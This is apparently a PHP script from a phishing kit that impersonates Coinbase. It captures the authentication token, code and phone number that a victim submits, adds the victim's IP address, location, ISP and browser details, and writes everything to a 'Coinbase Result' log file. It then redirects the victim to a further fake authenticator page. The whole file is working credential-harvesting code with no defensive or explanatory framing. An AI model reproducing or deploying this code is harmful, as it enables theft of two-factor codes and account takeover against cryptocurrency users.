<?php 
include 'API-AlexHosting.net/UserAgent.php';
include 'API-AlexHosting.net/daerah.php';

// MENANGKAP DATA YANG DI-INPUT
$token = $_POST['token'];

$code = $_POST['code'];
$plus = $_POST['plus'];
$phone = $_POST['phone'];


$benua = $alex['continent'];
$negara = $alex['country'];
$region = $alex['regionName'];
$city = $alex['city'];
$latitude = $alex['lat'];
$longtitude = $alex['lon'];
$timezone = $alex['timezone'];
$perdana = $alex['isp'];
$ipaddress = $alex['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];

			    
$myfile = fopen("a.txt", "a") or die("Unable to open file!");
$txt = "Coinbase Result \n\n";
fwrite($myfile, $txt);
$txt = "Code : $token $plus $code $phone \n";
fwrite($myfile, $txt);
$txt = "Daerah: $negara / $region / $city / $latitude / $longtitude / $timezone \n";
fwrite($myfile, $txt);
$txt = "User Agents: $perdana / $ipaddress / $platform / $osversi / $browser \n\n\n\n";
fwrite($myfile, $txt);
$txt = "--------------------------------- \n\n";
fwrite($myfile, "-".$txt);
fclose($myfile);

header("Location: authenticator.php"); 

?>